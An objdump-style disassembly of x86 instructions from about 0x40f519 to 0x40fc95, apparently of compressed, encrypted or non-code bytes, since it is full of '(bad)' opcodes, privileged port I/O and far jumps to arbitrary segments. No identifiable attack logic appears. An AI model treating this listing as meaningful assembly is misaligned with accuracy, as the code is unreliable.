  40f519:	adc    edx,DWORD PTR [ebp+0x0]
  40f51c:	retf   
  40f51d:	push   ebx
  40f51e:	or     esp,ecx
  40f520:	mov    al,0x2c
  40f522:	lods   eax,DWORD PTR ds:[esi]
  40f523:	js     0x40f4ab
  40f525:	pop    eax
  40f526:	jne    0x40f5a0
  40f528:	mov    ds:0xfe7fe18d,al
  40f52d:	sbb    dh,bl
  40f52f:	inc    edx
  40f530:	add    edi,DWORD PTR [ebp-0x2e]
  40f533:	dec    ebx
  40f534:	push   esp
  40f535:	cmc    
  40f536:	out    dx,eax
  40f537:	sub    ebp,DWORD PTR [edi]
  40f539:	dec    edi
  40f53a:	dec    edx
  40f53b:	sub    ah,BYTE PTR [edx-0x28]
  40f53e:	mov    eax,0x7e218038
  40f543:	cmp    al,0x80
  40f545:	xor    al,0xf8
  40f547:	lea    edx,[edi+0x73]
  40f54a:	xchg   esp,eax
  40f54b:	stc    
  40f54c:	or     al,0x4c
  40f54e:	aad    0x81
  40f550:	fisttp QWORD PTR [eax-0x38]
  40f553:	lods   al,BYTE PTR ds:[esi]
  40f554:	mov    ah,0x83
  40f556:	lahf   
  40f557:	mov    eax,ds:0xc158552b
  40f55c:	xor    al,0x56
  40f55e:	or     ch,cl
  40f560:	in     al,dx
  40f561:	inc    edx
  40f562:	leave  
  40f563:	jne    0x40f51e
  40f565:	scas   al,BYTE PTR es:[edi]
  40f566:	out    dx,eax
  40f567:	inc    esp
  40f568:	cmp    DWORD PTR [esp+edx*2+0x7c],eax
  40f56c:	sbb    eax,0xb10fcb5e
  40f571:	push   ss
  40f572:	adc    BYTE PTR [ecx],0xde
  40f575:	mov    edi,0x82fb7ab4
  40f57a:	out    dx,al
  40f57b:	and    eax,0xd7a5a7dd
  40f580:	repz push ebx
  40f582:	retf   0xa28a
  40f585:	inc    edi
  40f586:	inc    edx
  40f587:	mov    cl,0x71
  40f589:	leave  
  40f58a:	push   ebp
  40f58b:	jge    0x40f5f2
  40f58d:	jp     0x40f528
  40f58f:	jns    0x40f5a8
  40f591:	push   ss
  40f592:	fndisi(8087 only) 
  40f594:	inc    edi
  40f595:	pop    eax
  40f596:	fcomi  st,st(0)
  40f598:	pushf  
  40f599:	int3   
  40f59a:	mov    dh,0x15
  40f59c:	iret   
  40f59d:	xchg   ebx,eax
  40f59e:	les    ebp,FWORD PTR [esi+ecx*2-0x7616b5e8]
  40f5a5:	fmul   QWORD PTR [eax-0x2]
  40f5a8:	jl     0x40f5aa
  40f5aa:	nop
  40f5ab:	and    al,0x51
  40f5ad:	sub    eax,0x9ce56333
  40f5b2:	push   ss
  40f5b3:	lock jl 0x40f539
  40f5b6:	pop    ebx
  40f5b7:	dec    esp
  40f5b8:	lods   eax,DWORD PTR ds:[esi]
  40f5b9:	fiadd  DWORD PTR [ebp+0x3]
  40f5bc:	retf   0xc09
  40f5bf:	adc    eax,0x5e510620
  40f5c4:	arpl   WORD PTR [ebp-0x44],dx
  40f5c7:	jmp    0xbfdec72c
  40f5cc:	cwde   
  40f5cd:	repz aam 0x9
  40f5d0:	dec    ebp
  40f5d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f5d2:	leave  
  40f5d3:	xor    DWORD PTR [edx+0x7f],esp
  40f5d6:	or     BYTE PTR [ebx+0x5c],bl
  40f5d9:	pop    ecx
  40f5da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5db:	push   ebp
  40f5dc:	test   DWORD PTR [edi+0x656ca625],0x3cfdec56
  40f5e6:	frstor [ebp+0x77]
  40f5e9:	pop    es
  40f5ea:	jbe    0x40f649
  40f5ec:	push   esi
  40f5ed:	push   0xfffffff4
  40f5ef:	clc    
  40f5f0:	add    DWORD PTR [eax],esi
  40f5f2:	mov    esi,0xbf13c4df
  40f5f7:	xor    al,0x6a
  40f5f9:	shl    eax,1
  40f5fb:	mov    edi,0x41fb19d2
  40f600:	test   al,0x4c
  40f602:	ins    BYTE PTR es:[edi],dx
  40f603:	jbe    0x40f5bf
  40f605:	(bad)  
  40f607:	es icebp 
  40f609:	ficom  WORD PTR [ecx]
  40f60b:	mov    ds:0x43b35cb3,al
  40f610:	pop    es
  40f611:	mov    dh,0xc
  40f613:	fdiv   QWORD PTR [ebp-0x48]
  40f616:	xchg   edx,eax
  40f617:	sbb    al,BYTE PTR [edi+0x14]
  40f61a:	or     ah,BYTE PTR [ecx-0x5d]
  40f61d:	jnp    0x40f69b
  40f61f:	ficom  DWORD PTR [edi+0x61]
  40f622:	mov    BYTE PTR [eax-0x3f],bh
  40f625:	jo     0x40f69b
  40f627:	in     eax,dx
  40f628:	loopne 0x40f5cf
  40f62a:	je     0x40f602
  40f62c:	add    ecx,DWORD PTR [edx+0x6c]
  40f62f:	lea    ebp,[edx+0x54]
  40f632:	xchg   edi,eax
  40f633:	add    BYTE PTR [esi+0x44],bl
  40f636:	lods   eax,DWORD PTR ds:[esi]
  40f637:	pop    es
  40f638:	pop    es
  40f639:	das    
  40f63a:	jb     0x40f6b4
  40f63c:	mov    cl,0xe2
  40f63e:	pusha  
  40f63f:	push   ecx
  40f640:	dec    eax
  40f641:	or     BYTE PTR gs:[eax-0x60],cl
  40f645:	mov    DWORD PTR [ecx-0x5930e2f0],0x4aea3b8c
  40f64f:	xchg   esp,eax
  40f650:	cmova  esp,DWORD PTR [eax-0x4c0edefd]
  40f657:	sub    edx,ebx
  40f659:	outs   dx,BYTE PTR ds:[esi]
  40f65a:	fild   QWORD PTR [ebx]
  40f65c:	je     0x40f6c3
  40f65e:	mov    dh,0xd7
  40f660:	mov    dl,0x83
  40f662:	adc    bl,BYTE PTR [edx-0x4c]
  40f665:	in     al,dx
  40f666:	jbe    0x40f609
  40f668:	pop    esp
  40f669:	mov    ds:0x36351bbd,eax
  40f66e:	inc    esi
  40f66f:	push   ebp
  40f670:	stos   BYTE PTR es:[edi],al
  40f671:	les    ebp,FWORD PTR gs:[eax+0x3819d7]
  40f678:	xor    DWORD PTR [edi+0x6a807472],0x9fcc92c3
  40f682:	bnd jo 0x40f646
  40f685:	dec    ebx
  40f686:	jae    0x40f6ff
  40f688:	fadd   QWORD PTR [eax*8-0x55204921]
  40f68f:	nop
  40f690:	adc    al,0xb
  40f692:	sub    DWORD PTR [eax-0x479507c6],eax
  40f698:	retf   0x21ff
  40f69b:	das    
  40f69c:	inc    ecx
  40f69d:	mov    DWORD PTR [eax+ebp*8],0xedf2406a
  40f6a4:	sbb    ebx,0xa2af7fc7
  40f6aa:	dec    ecx
  40f6ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6ac:	cli    
  40f6ad:	and    BYTE PTR [ebp-0x26256b4b],cl
  40f6b3:	jno    0x40f678
  40f6b5:	push   ds
  40f6b6:	icebp  
  40f6b7:	inc    esi
  40f6b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6b9:	sti    
  40f6ba:	push   cs
  40f6bb:	mov    ecx,0xa42f1097
  40f6c0:	cdq    
  40f6c1:	shl    BYTE PTR [ecx],cl
  40f6c3:	cmp    al,0x2d
  40f6c5:	sbb    cl,BYTE PTR ds:[ecx+0x7a181310]
  40f6cc:	jl     0x40f64f
  40f6ce:	xchg   BYTE PTR [edx-0x15],dl
  40f6d1:	dec    edx
  40f6d2:	push   esp
  40f6d3:	loopne 0x40f6b6
  40f6d5:	jb     0x40f722
  40f6d7:	(bad)  
  40f6d8:	div    dl
  40f6da:	test   BYTE PTR [ecx],bl
  40f6dc:	sti    
  40f6dd:	arpl   dx,bp
  40f6df:	int3   
  40f6e0:	(bad)  
  40f6e1:	sub    al,0x13
  40f6e3:	clc    
  40f6e4:	and    bl,BYTE PTR [edx-0x29]
  40f6e7:	pop    edi
  40f6e8:	mov    esp,0x7099d6e9
  40f6ed:	adc    BYTE PTR ds:0x9644550e,ch
  40f6f3:	lahf   
  40f6f4:	push   cx
  40f6f6:	jg     0x40f688
  40f6f8:	xchg   BYTE PTR [ebp+ebx*8+0x78cbefbf],dl
  40f6ff:	adc    eax,0xf1f51e28
  40f704:	jae    0x40f6b4
  40f706:	shl    DWORD PTR [ebp+0x66195417],0x6c
  40f70d:	imul   ecx,DWORD PTR [edi],0x7
  40f710:	mov    al,BYTE PTR [esi+edi*2]
  40f713:	sbb    BYTE PTR [ebp+0x46],ah
  40f716:	lds    edi,FWORD PTR [ebx]
  40f718:	gs scas al,BYTE PTR es:[edi]
  40f71a:	cmc    
  40f71b:	mov    DWORD PTR [esi+ecx*1+0x7861f9e7],ebp
  40f722:	mov    esi,esi
  40f724:	xor    al,0x5
  40f726:	retf   
  40f727:	inc    esp
  40f728:	fdivr  st,st(1)
  40f72a:	aam    0xc6
  40f72c:	pop    eax
  40f72d:	xchg   edi,eax
  40f72e:	fld    QWORD PTR [ebx+0x58]
  40f731:	into   
  40f732:	dec    esp
  40f733:	cdq    
  40f734:	dec    ebp
  40f735:	adc    edx,eax
  40f737:	xchg   dl,bh
  40f739:	mul    eax
  40f73b:	sub    BYTE PTR cs:[ebx+0x6f56485b],0xac
  40f743:	mov    ch,0x29
  40f745:	dec    esp
  40f746:	pop    ebp
  40f747:	es xchg esp,eax
  40f749:	(bad)  
  40f74b:	cmp    eax,ecx
  40f74d:	or     al,0x4c
  40f74f:	adc    cl,BYTE PTR [esi-0x55cc6a6a]
  40f755:	lock sub edx,DWORD PTR [edx-0x20]
  40f759:	dec    ebx
  40f75a:	and    DWORD PTR ds:[ecx+0x3208f6e],edi
  40f761:	sar    BYTE PTR [ecx+0x9],0xba
  40f765:	adc    al,0xc2
  40f767:	popa   
  40f768:	xchg   edi,eax
  40f769:	pop    edx
  40f76a:	pusha  
  40f76b:	dec    eax
  40f76c:	cmp    al,0x38
  40f76e:	mov    ch,0x2d
  40f770:	lahf   
  40f771:	loope  0x40f720
  40f773:	pop    es
  40f774:	or     ebp,esp
  40f776:	push   esi
  40f777:	xchg   ecx,eax
  40f778:	adc    BYTE PTR [esi-0x33e38a10],0x57
  40f77f:	xchg   esi,eax
  40f780:	and    eax,0x577ca735
  40f785:	aam    0xfe
  40f787:	es inc eax
  40f789:	ja     0x40f7a7
  40f78b:	data16 outs dx,BYTE PTR ds:[esi]
  40f78d:	in     al,0xdb
  40f78f:	pop    ss
  40f790:	push   esp
  40f791:	in     eax,dx
  40f792:	add    eax,0xa3d87d24
  40f797:	lock push ss
  40f799:	sbb    al,0x49
  40f79b:	imul   esp,DWORD PTR [esi-0x6451fe97],0x60
  40f7a2:	mov    edi,0x56753b13
  40f7a7:	lea    ebx,ds:0x2f649295
  40f7ad:	in     al,0x7c
  40f7af:	loope  0x40f7de
  40f7b1:	into   
  40f7b2:	test   DWORD PTR [ebx-0x7dcca807],ebx
  40f7b8:	mov    edi,0x62370d06
  40f7bd:	out    0x3b,eax
  40f7bf:	dec    ebp
  40f7c0:	jp     0x40f7cc
  40f7c2:	(bad)  
  40f7c3:	stc    
  40f7c4:	fdiv   QWORD PTR [eax+0x2ea692ba]
  40f7ca:	inc    eax
  40f7cb:	mov    edi,0xa6798432
  40f7d0:	dec    ecx
  40f7d1:	rcr    DWORD PTR [ebx+0x3bb3a8fe],cl
  40f7d7:	cmp    eax,0xfb48f11a
  40f7dc:	leave  
  40f7dd:	push   0x43
  40f7df:	lock addr16 cmp eax,0xc8515de7
  40f7e6:	xlat   BYTE PTR ds:[ebx]
  40f7e7:	xrelease xchg BYTE PTR [ebx+esi*8-0x72],bl
  40f7ec:	retf   0x86fe
  40f7ef:	push   ebp
  40f7f0:	scas   al,BYTE PTR es:[edi]
  40f7f1:	js     0x40f80b
  40f7f3:	xlat   BYTE PTR ds:[ebx]
  40f7f4:	and    BYTE PTR [ecx-0x2],ah
  40f7f7:	test   eax,0xe87ab968
  40f7fc:	mov    ch,0xd2
  40f7fe:	rol    BYTE PTR [ebx+0x18],0xcd
  40f802:	loop   0x40f849
  40f804:	pop    edx
  40f805:	das    
  40f806:	sbb    al,0xfe
  40f808:	loopne 0x40f83c
  40f80a:	push   ebx
  40f80b:	cmc    
  40f80c:	mov    BYTE PTR [edi-0x58f14e2d],ah
  40f812:	fcomp  QWORD PTR [ebx-0x59]
  40f815:	(bad)  
  40f816:	cld    
  40f817:	mov    edi,ebp
  40f819:	imul   edi,esi,0x3e032fc8
  40f81f:	call   0xad68fc0
  40f824:	sbb    esi,DWORD PTR [edi-0x3b5e62ba]
  40f82a:	rcl    ebx,cl
  40f82c:	lock or al,0x1d
  40f82f:	sbb    BYTE PTR ds:0xfd8c8da9,dh
  40f835:	and    ebx,DWORD PTR [ebx+0x37be6ca7]
  40f83b:	jb     0x40f8a6
  40f83d:	lods   al,BYTE PTR ds:[esi]
  40f83e:	lds    ecx,FWORD PTR [esi]
  40f840:	inc    ebx
  40f841:	inc    esi
  40f842:	pushf  
  40f843:	cmp    DWORD PTR [ebx-0x53e20260],eax
  40f849:	mov    cl,0xa0
  40f84b:	mov    esi,0x52257522
  40f850:	and    eax,0x24537b59
  40f855:	dec    edi
  40f856:	and    bh,BYTE PTR [eax+0x1]
  40f859:	sar    edx,1
  40f85b:	add    DWORD PTR [eax-0x2d],0x173cf63a
  40f862:	ss mov eax,0x1d39321b
  40f868:	or     eax,0xcdcf52b2
  40f86d:	jp     0x40f7f4
  40f86f:	loope  0x40f828
  40f871:	or     eax,0x32d5375e
  40f876:	sub    al,0x8c
  40f878:	or     DWORD PTR [ebx-0x760af17],ebp
  40f87e:	dec    edi
  40f87f:	or     edi,ebx
  40f881:	cld    
  40f882:	xor    eax,0xf748d376
  40f887:	jecxz  0x40f8f8
  40f889:	sub    al,0xfe
  40f88b:	pop    esi
  40f88c:	mov    bh,0x9b
  40f88e:	pop    es
  40f88f:	aad    0xcd
  40f891:	call   0x50eca802
  40f896:	mov    ss,WORD PTR fs:[esi+0x337243c6]
  40f89d:	push   eax
  40f89e:	imul   edi,DWORD PTR [eax+0x17f85c39],0x3d
  40f8a5:	xor    al,0x3b
  40f8a7:	pop    es
  40f8a8:	gs mov dh,0xf1
  40f8ab:	neg    DWORD PTR [esi-0x4c]
  40f8ae:	mov    esi,0xdd5a8f10
  40f8b3:	sbb    ebp,DWORD PTR [edx-0x31b911ae]
  40f8b9:	sbb    BYTE PTR [ebp+0x50],ah
  40f8bc:	mov    DWORD PTR [esp+ecx*8+0x33f4fcf7],esp
  40f8c3:	xchg   esp,eax
  40f8c4:	ss dec esp
  40f8c6:	and    eax,0x6428c4e5
  40f8cb:	arpl   bx,bp
  40f8cd:	push   0xffffff8d
  40f8cf:	loop   0x40f88c
  40f8d1:	xchg   edi,eax
  40f8d2:	lds    edx,FWORD PTR [ecx+edx*2]
  40f8d5:	adc    BYTE PTR ds:0xa9988ee,ch
  40f8db:	mov    esp,0xcce5e00a
  40f8e0:	jb     0x40f8f9
  40f8e2:	mov    ds:0xbcd2f43b,al
  40f8e7:	mov    cl,BYTE PTR [ebx]
  40f8e9:	call   0x45f9:0xffbbd7df
  40f8f0:	cmp    al,BYTE PTR [edi]
  40f8f2:	aam    0x8a
  40f8f4:	push   DWORD PTR [edi+0x3080c199]
  40f8fa:	inc    ecx
  40f8fb:	stc    
  40f8fc:	inc    esp
  40f8fd:	(bad)  
  40f8fe:	pop    esi
  40f8ff:	in     al,dx
  40f900:	push   0xc5201f7f
  40f905:	(bad)  
  40f906:	mov    eax,0x57cc0f45
  40f90b:	imul   edi,DWORD PTR [edx+0x3dd75ea8],0xfe32fc51
  40f915:	xor    ebp,esi
  40f917:	pop    es
  40f918:	fisttp DWORD PTR [ebp+0x15]
  40f91b:	and    al,BYTE PTR [ebx]
  40f91d:	add    cl,BYTE PTR [eax+0x69]
  40f920:	pop    ecx
  40f921:	daa    
  40f922:	inc    ecx
  40f923:	test   al,0x42
  40f925:	cmp    DWORD PTR [edx-0x6],esi
  40f928:	call   0xe25dc7d1
  40f92d:	push   ecx
  40f92e:	jo     0x40f93a
  40f930:	addr16 mov al,ds:0x15f3
  40f934:	sbb    DWORD PTR [edx],eax
  40f936:	or     BYTE PTR [ebx-0xb50dd9a],cl
  40f93c:	fmul   QWORD PTR [edi+0x40c529ad]
  40f942:	mov    esi,0x90685d0f
  40f947:	in     eax,0x76
  40f949:	push   ds
  40f94a:	pop    ebp
  40f94b:	leave  
  40f94c:	fisttp WORD PTR [ebx]
  40f94e:	xor    cl,BYTE PTR [ebp-0x40]
  40f951:	inc    edi
  40f952:	cmp    bl,BYTE PTR [esp+ebp*1]
  40f955:	xchg   ebx,eax
  40f956:	shl    BYTE PTR ds:0x3511493f,0xbe
  40f95d:	xchg   ebx,eax
  40f95e:	push   esp
  40f95f:	outs   dx,DWORD PTR ds:[esi]
  40f960:	sbb    al,0xda
  40f962:	push   ebx
  40f963:	xor    edi,0x4e
  40f966:	gs ja  0x40f9c3
  40f969:	cdq    
  40f96a:	xor    dh,dl
  40f96c:	xchg   edi,eax
  40f96d:	(bad)  
  40f96e:	idiv   ah
  40f970:	pop    edx
  40f971:	dec    ebp
  40f972:	lods   al,BYTE PTR ds:[esi]
  40f973:	mov    al,0x7a
  40f975:	(bad)  
  40f977:	mov    dh,0x9d
  40f979:	dec    eax
  40f97a:	jmp    0x40f9e5
  40f97c:	call   0xfdbd9d07
  40f981:	bound  ecx,QWORD PTR [ecx+esi*4+0x1]
  40f985:	out    0xb9,al
  40f987:	mov    esi,0x5c87c1a4
  40f98c:	push   esi
  40f98d:	cs push 0x26
  40f990:	div    BYTE PTR [edx+eiz*8-0xf]
  40f994:	sub    DWORD PTR [edx+ebx*1],ebp
  40f997:	ffree  st(5)
  40f999:	je     0x40f94d
  40f99b:	stos   DWORD PTR es:[edi],eax
  40f99c:	push   0xffffff85
  40f99e:	stos   BYTE PTR es:[edi],al
  40f99f:	sbb    eax,0xe106e051
  40f9a4:	dec    ebp
  40f9a5:	pop    esp
  40f9a6:	mov    ecx,0xd049ae9c
  40f9ab:	sbb    esi,edi
  40f9ad:	sti    
  40f9ae:	jl     0x40f9d0
  40f9b0:	arpl   ax,bx
  40f9b2:	jb     0x40f9b2
  40f9b4:	arpl   bp,cx
  40f9b6:	aaa    
  40f9b7:	mov    eax,ebp
  40f9b9:	idiv   DWORD PTR [esi-0x65]
  40f9bc:	inc    esp
  40f9bd:	pop    edx
  40f9be:	xor    al,0x26
  40f9c0:	shl    dl,0xcf
  40f9c3:	inc    edx
  40f9c4:	call   0xe1ac:0xb7583ec8
  40f9cb:	setl   BYTE PTR [edi]
  40f9ce:	push   ecx
  40f9cf:	cmp    DWORD PTR [esi-0x4271ab16],edi
  40f9d5:	adc    DWORD PTR [ebx+0x6a5de764],edi
  40f9db:	call   0x7292:0xb0bc34d7
  40f9e2:	ja     0x40fa4c
  40f9e4:	sub    eax,DWORD PTR [ecx]
  40f9e6:	jmp    0x42c4:0x707185d0
  40f9ed:	mov    al,0x81
  40f9ef:	lea    edi,[eax-0x71]
  40f9f2:	pop    ebp
  40f9f3:	sbb    cl,BYTE PTR [edi-0x3c]
  40f9f6:	cwde   
  40f9f7:	bound  esi,QWORD PTR [ecx-0x40e595cc]
  40f9fd:	push   0xa8990d4e
  40fa02:	fisubr WORD PTR [ecx]
  40fa04:	stos   DWORD PTR es:[edi],eax
  40fa05:	pop    ebx
  40fa06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa07:	fld    TBYTE PTR [esp+edi*2]
  40fa0a:	jmp    0x9419:0x68a4be58
  40fa11:	mov    ds:0x8718344b,eax
  40fa16:	adc    eax,0x63a944e9
  40fa1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa1c:	outs   dx,DWORD PTR ds:[esi]
  40fa1d:	xor    bl,al
  40fa1f:	clc    
  40fa20:	jmp    0x40fa5d
  40fa22:	or     eax,0xb89ec38d
  40fa27:	xlat   BYTE PTR ds:[ebx]
  40fa28:	stc    
  40fa29:	push   ebp
  40fa2a:	bnd jge 0x40fa6b
  40fa2d:	fdivr  DWORD PTR [eax]
  40fa2f:	add    ebp,ebx
  40fa31:	out    0xf5,al
  40fa33:	nop
  40fa34:	dec    edx
  40fa35:	in     al,dx
  40fa36:	dec    esi
  40fa37:	lahf   
  40fa38:	call   0x29d3:0xbe5185fd
  40fa3f:	pushf  
  40fa40:	test   al,ch
  40fa42:	push   0xfffffffe
  40fa44:	jbe    0x40f9cf
  40fa46:	ror    DWORD PTR [ecx+0x29],cl
  40fa49:	nop
  40fa4a:	test   BYTE PTR [esi],ah
  40fa4c:	cmp    esi,DWORD PTR [eax]
  40fa4e:	inc    edx
  40fa4f:	xor    eax,DWORD PTR [edx+0x405103bc]
  40fa55:	mov    bl,0x14
  40fa57:	and    ebx,DWORD PTR [ebp-0x1b3dc0c7]
  40fa5d:	or     ebp,DWORD PTR [edi+0x74a0aba2]
  40fa63:	fistp  WORD PTR [edx+0x5c4f2710]
  40fa69:	loopne 0x40fa4f
  40fa6b:	jmp    0x40f9ef
  40fa6d:	or     BYTE PTR [ebx-0x2e8462e6],dl
  40fa73:	xchg   edx,eax
  40fa74:	inc    esi
  40fa75:	in     eax,dx
  40fa76:	jae    0x40faf6
  40fa78:	and    ch,0x26
  40fa7b:	pop    esp
  40fa7c:	mov    dh,0x74
  40fa7e:	sub    BYTE PTR [ebx-0x6c05bbe1],dh
  40fa84:	adc    BYTE PTR [esi],ah
  40fa86:	xchg   bh,ah
  40fa88:	jle    0x40fb04
  40fa8a:	adc    al,0xf7
  40fa8c:	ret    
  40fa8d:	push   ss
  40fa8e:	mov    dl,0x54
  40fa90:	enter  0x1aae,0xf9
  40fa94:	shr    BYTE PTR [ecx+ebp*1],1
  40fa97:	mov    esp,DWORD PTR [edi+0x52b09a17]
  40fa9d:	mov    eax,ds:0x5a191b9e
  40faa2:	cmp    eax,0x3c50409b
  40faa7:	mov    BYTE PTR [ebx],bh
  40faa9:	idiv   BYTE PTR [esi]
  40faab:	ret    0x4ca5
  40faae:	fs ja  0x40faeb
  40fab1:	in     al,dx
  40fab2:	sub    BYTE PTR [esi+0x74],bl
  40fab5:	jmp    0x94ddc969
  40faba:	fs add al,bh
  40fabd:	xor    al,al
  40fabf:	outs   dx,DWORD PTR ds:[esi]
  40fac0:	and    cl,BYTE PTR [ebp+ecx*1+0x56]
  40fac4:	dec    esp
  40fac5:	mov    edi,0x7e70b3f9
  40faca:	inc    edx
  40facb:	adc    BYTE PTR [edi+edi*8],al
  40face:	xrelease mov DWORD PTR [ebp+eax*4-0x12fce05b],ebx
  40fad6:	jbe    0x40faca
  40fad8:	inc    edi
  40fad9:	jecxz  0x40fab9
  40fadb:	ja     0x40fb10
  40fadd:	pop    eax
  40fade:	into   
  40fadf:	push   0xc0061d25
  40fae4:	repz sub dh,BYTE PTR [esi+0xa]
  40fae8:	mov    cs,edi
  40faea:	and    al,0xce
  40faec:	push   ss
  40faed:	in     eax,0xdd
  40faef:	in     al,0xeb
  40faf1:	clc    
  40faf2:	mov    esi,0xac5ee4f4
  40faf7:	jno    0x40fa82
  40faf9:	jne    0x40fb03
  40fafb:	dec    ebx
  40fafc:	in     al,dx
  40fafd:	add    al,0x21
  40faff:	aad    0x10
  40fb01:	inc    esi
  40fb02:	pop    ecx
  40fb03:	cld    
  40fb04:	adc    eax,0x4a77e99a
  40fb09:	imul   esp,DWORD PTR [edi],0x5003f66
  40fb0f:	out    0x6e,eax
  40fb11:	xchg   ebp,eax
  40fb12:	and    DWORD PTR [ecx],eax
  40fb14:	and    ah,al
  40fb16:	add    BYTE PTR [edi-0xa],dh
  40fb19:	loope  0x40fac5
  40fb1b:	test   BYTE PTR [ebp-0xc],al
  40fb1e:	inc    eax
  40fb1f:	sbb    dh,BYTE PTR [ecx+0xf]
  40fb22:	mov    al,0xeb
  40fb24:	pop    ebp
  40fb25:	fstp   TBYTE PTR [ecx]
  40fb27:	xor    al,BYTE PTR [eax+eax*4+0x769812c2]
  40fb2e:	jbe    0x40fac7
  40fb30:	ret    0x5993
  40fb33:	or     DWORD PTR [ecx+esi*8+0x6090f454],edx
  40fb3a:	mov    eax,0x381301b0
  40fb3f:	xor    esi,DWORD PTR [edi+0x4da9583f]
  40fb45:	and    ah,BYTE PTR [ecx+esi*2-0x37b9d899]
  40fb4c:	pop    esp
  40fb4d:	push   edx
  40fb4e:	pop    es
  40fb4f:	(bad)  [eax+ecx*2+0x700de81d]
  40fb56:	xor    eax,0x78d0b62c
  40fb5b:	ss dec esi
  40fb5d:	dec    edx
  40fb5e:	sbb    eax,0x641840b8
  40fb63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb64:	or     eax,0xb47cbe0
  40fb69:	fld    QWORD PTR [ebp-0x7605a805]
  40fb6f:	jge    0x40fb97
  40fb71:	clc    
  40fb72:	or     DWORD PTR [edx],edi
  40fb74:	jmp    0xc460000f
  40fb79:	mov    eax,0x2723fb25
  40fb7e:	loop   0x40fb60
  40fb80:	rol    BYTE PTR [esi+ebp*2-0x6c430b9d],1
  40fb87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb88:	scas   al,BYTE PTR es:[edi]
  40fb89:	cmp    edi,eax
  40fb8b:	int3   
  40fb8c:	push   edi
  40fb8d:	test   al,0x28
  40fb8f:	jae    0x40fb45
  40fb91:	xchg   ecx,eax
  40fb92:	cmp    eax,0xb1352f8e
  40fb97:	xchg   edi,eax
  40fb98:	js     0x40fbbe
  40fb9a:	dec    edi
  40fb9b:	jo     0x40fc0e
  40fb9d:	xlat   BYTE PTR ds:[ebx]
  40fb9e:	dec    ecx
  40fb9f:	fwait
  40fba0:	push   0xffffffa3
  40fba2:	hlt    
  40fba3:	adc    BYTE PTR [ebx-0x61f1e24a],al
  40fba9:	and    al,0xb9
  40fbab:	popf   
  40fbac:	push   esp
  40fbad:	mov    ebp,ebx
  40fbaf:	mov    dh,BYTE PTR [esi]
  40fbb1:	loope  0x40fbca
  40fbb3:	cmp    dh,cl
  40fbb5:	pop    esp
  40fbb6:	adc    esp,DWORD PTR [ebx]
  40fbb8:	fcom   st(2)
  40fbba:	jae    0x40fba6
  40fbbc:	bound  ebp,QWORD PTR [esi+eax*1+0x3b]
  40fbc0:	dec    ebx
  40fbc1:	xchg   esi,eax
  40fbc2:	xchg   bx,ax
  40fbc4:	loop   0x40fbbc
  40fbc6:	ficomp DWORD PTR [ebx]
  40fbc8:	data16 jl 0x40fbb8
  40fbcb:	jns    0x40fbcb
  40fbcd:	sbb    bl,BYTE PTR [ebx]
  40fbcf:	ins    WORD PTR es:[edi],dx
  40fbd1:	and    eax,0xad444455
  40fbd6:	sti    
  40fbd7:	stos   BYTE PTR es:[edi],al
  40fbd8:	(bad)  
  40fbd9:	xchg   edi,eax
  40fbda:	xchg   esp,eax
  40fbdb:	sahf   
  40fbdc:	retf   0x824c
  40fbdf:	int    0xc6
  40fbe1:	push   esi
  40fbe2:	mov    bh,0x74
  40fbe4:	push   0x9a6e557f
  40fbe9:	neg    DWORD PTR [ecx-0x44]
  40fbec:	out    dx,al
  40fbed:	cli    
  40fbee:	in     al,dx
  40fbef:	popa   
  40fbf0:	pop    esi
  40fbf1:	push   0x228aa908
  40fbf6:	mov    ecx,eax
  40fbf8:	mov    bh,0x5a
  40fbfa:	cmc    
  40fbfb:	fldcw  WORD PTR [ecx]
  40fbfd:	into   
  40fbfe:	push   eax
  40fbff:	sbb    cl,BYTE PTR [eax]
  40fc01:	or     eax,0xa58e22b2
  40fc06:	cmp    BYTE PTR [eax],dl
  40fc08:	xchg   esp,eax
  40fc09:	pop    ebp
  40fc0a:	shl    BYTE PTR [ebx-0x2aefe2e3],1
  40fc10:	mov    ds:0x7d146ac2,eax
  40fc15:	stos   DWORD PTR es:[edi],eax
  40fc16:	jmp    0x6c1a:0x1eeffa09
  40fc1d:	dec    eax
  40fc1e:	add    BYTE PTR [edx-0x59],cl
  40fc21:	int3   
  40fc22:	imul   esp,DWORD PTR [eax-0x3ac131ac],0x43
  40fc29:	xchg   edi,eax
  40fc2a:	call   0x983:0xe150e7f5
  40fc31:	cmp    eax,0x601ed884
  40fc36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc37:	loop   0x40fbbb
  40fc39:	push   0xffffff97
  40fc3b:	adc    BYTE PTR [ebx],ch
  40fc3d:	push   esp
  40fc3e:	fst    st(2)
  40fc40:	mov    es,WORD PTR [esi+0x41]
  40fc43:	repz inc ebp
  40fc45:	dec    eax
  40fc46:	dec    edi
  40fc47:	test   eax,0xb6539017
  40fc4c:	lods   al,BYTE PTR ds:[esi]
  40fc4d:	mov    edi,0x7e8dcba3
  40fc52:	test   BYTE PTR [ecx+0x34],0x61
  40fc56:	in     al,0xd5
  40fc58:	pop    edx
  40fc59:	shl    bl,cl
  40fc5b:	add    edx,ebx
  40fc5d:	cmp    BYTE PTR ds:0xa7eae90c,cl
  40fc63:	xor    BYTE PTR [eax],0xd1
  40fc66:	jmp    0x40fbf4
  40fc68:	fs leave 
  40fc6a:	arpl   WORD PTR [edx+eax*1+0x5f],ax
  40fc6e:	rcl    DWORD PTR [eax-0xc],1
  40fc71:	inc    esp
  40fc72:	icebp  
  40fc73:	dec    eax
  40fc74:	scas   eax,DWORD PTR es:[edi]
  40fc75:	(bad)  
  40fc76:	gs mov ch,0x2e
  40fc79:	sbb    ch,BYTE PTR [eax-0xb7ebc45]
  40fc7f:	and    BYTE PTR [eax-0x32],ch
  40fc82:	lock cwde 
  40fc84:	pusha  
  40fc85:	mov    esi,0x436fbb79
  40fc8a:	out    dx,al
  40fc8b:	inc    ebp
  40fc8c:	mov    esi,0x5c0457ea
  40fc91:	stos   BYTE PTR es:[edi],al
  40fc92:	mov    dh,0x52
  40fc94:	das    
  40fc95:	and    BYTE PTR ds:0x24f809a4,al
